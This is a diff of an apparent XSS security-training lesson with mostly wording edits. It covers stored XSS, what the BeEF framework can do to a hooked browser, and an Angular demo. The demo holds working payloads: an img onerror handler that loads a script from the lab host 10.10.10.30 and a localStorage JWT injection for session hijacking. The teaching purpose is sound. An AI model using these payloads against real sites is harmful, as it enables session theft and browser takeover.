@@ -27,7 +27,7 @@ XSS is often classified in terms of the first point above. Here's the currently 
 
 **Stored (aka Persisted) XSS**
 
-1. The attacker inserts some malicious data into the server's database. This might typically be by using the normal features of the application - no additional exploit might be necessary, nor any action by the victim. This is the 'Stored' bit.
+1. The attacker inserts some malicious data into the server's database. This might typically be by using the normal features of the application - no additional exploit might be necessary, nor any action by the victim. Or it may be done via a different application that uses the same database. This is the 'Stored' bit.
 2. The victim's browser sends an entirely innocent request to the server.
 3. The server embeds the malicious data in the response, typically HTML but there are other possibilities - it depends on the design of the site. The malicious data appears in the response in a place where the browser (and/or scripts running in the browser) will treat it as active content.
 4. The browser renders (or otherwise processes) the response, running the malicious data as commands. The bad thing (whatever the attack was - e.g. sending user data or session IDs to the attacker) happens.
@@ -61,13 +61,15 @@ See
 The Impact
 -----
 
-So, if XSS is injected into a page, what damage can it do? Depending on the device the page is loaded on, the damage can be **severe**. An example of this is the [Browser Exploitation Framework Project](http://beefproject.com/), a penetration testing tool, which like many of these can be used maliciously . The 'benign' usage of BeEF is to navigate to the site under test, and then run a script from the browser address bar or a bookmark. This script loads a further script from the tester's location, which sets up hooks for the tester to control the target browser - that page is now a 'zombie' in a small botnet.
+So, if XSS is injected into a page, what damage can it do? Depending on the device the page is loaded on, the damage can be **severe**. An example of this is the [Browser Exploitation Framework Project](http://beefproject.com/), a penetration testing tool, which like many of these can be used maliciously. The 'benign' usage of BeEF is to navigate to the site under test, and then run a script from the browser address bar or a bookmark. This script loads a further script from the tester's location, which sets up hooks for the tester to control the target browser - that page is now a 'zombie' in a small botnet, *for testing purposes*.
 
-In the 'malicious' usage, the attacker identifies an XSS vulnerability in the target site, then (e.g.) sends the victim a shortened URL that injects and runs the initial script via that vulnerability. The attacker now owns the victim's browser. You can try this, if you have the time/inclination to set it all up, but it's not going to help you test for or prevent XSS vulnerabilities, just exploit them, and that's not what this course is about.
+In the 'malicious' usage, the attacker identifies an XSS vulnerability in the target site, then (e.g.) sends the victim a shortened URL that injects and runs the initial script via that vulnerability. The attacker now owns the victim's browser.
 
-The BeEF project has the whole spectrum of attacks. On the lower end of the severety spectrum, it can: get your session cookie; reroute all hyperlinks to a pre-determined one; detect plugins installed; and attempt to get stored credentials (and auto-complete values) in a page. The rather alarming nature of what XSS can do starts to creep through when it can also: create a man-in-the-browser (logging every page you access); possibly change your router's admin password; take pictures through your webcam; perform social engineering in order to get your Google/Facebook/etc usernames and passwords; and potentially look through Gmail emails. The story just gets worse if the app uses PhoneGap. It can: locate you; list files on your device; list your contacts; record audio; and download files from the device -- all without the user's knowledge or approval.
+The BeEF project has the whole spectrum of attacks. On the lower end of the severity spectrum, it can: get your session cookie; reroute all hyperlinks to a pre-determined one; detect plugins installed; and attempt to get stored credentials (and auto-complete values) in a page. The rather alarming nature of what XSS can do starts to creep through when it can also: create a man-in-the-browser (logging every page you access); possibly change your router's admin password; take pictures through your webcam; perform social engineering in order to get your Google/Facebook/etc usernames and passwords; and potentially look through Gmail emails. The story just gets worse if the app uses PhoneGap. It can: locate you; list files on your device; list your contacts; record audio; and download files from the device -- all without the user's knowledge or approval.
 
 Now, consider the above in relation to Stored XSS on a high-profile target. Millions of people opening the page would have that script run and would all be hooked into calls from the server. They could also have access to passwords, and mount attacks to get even more. Scared yet?
+
+You can try this, if you have the time/inclination to set it all up, but it's not going to help you test for or prevent XSS vulnerabilities, just exploit them, and that's not what this course is about.
 
 
 Real-world examples
@@ -114,7 +116,7 @@ You can do a similar thing with the MEAN_stack sample, but the technicalities ar
 
     <img src="///" onerror="alert('hello')" />
 
-Angular is explicitly trusting the search term is safe (even though it's not), and binding it as-is. Normally, Angular wouldn't trust this, but it's been enabled since it's security training. Now, loading in a script here is more of an ask here, but it's doable in a couple of ways:
+Angular is explicitly trusting the search term is safe (even though it's not safe), and binding it as-is. Normally, Angular wouldn't trust this, but it's been enabled for demonstration purposes (or you could buy the fiction that a foolish developer did it on purpose so that users could put styling tags in their posts). Now, loading in a script here is more of an ask here, but it's doable in a couple of ways:
 
 * Perform an XMLHttpRequest, and evaluate the response; or
 * Create a script element, set its source to the target URL, and append it to the `<head>` tag
@@ -123,7 +125,7 @@ The latter is easier for our purposes, so let's just do that:
 
     <img src="///" onerror="a = document.createElement('script'); a.src = 'http://10.10.10.30/exploits/jwt.js'; document.head.appendChild(a);" />
 
-To hijack the session, open up a console in another browser and enter in,
+To hijack the session, put your attacker hat on, start the app in another browser window, open up a console and enter in,
 
     localStorage["ls.currentUser"] = JSON.stringify( your harvested JWT )
 
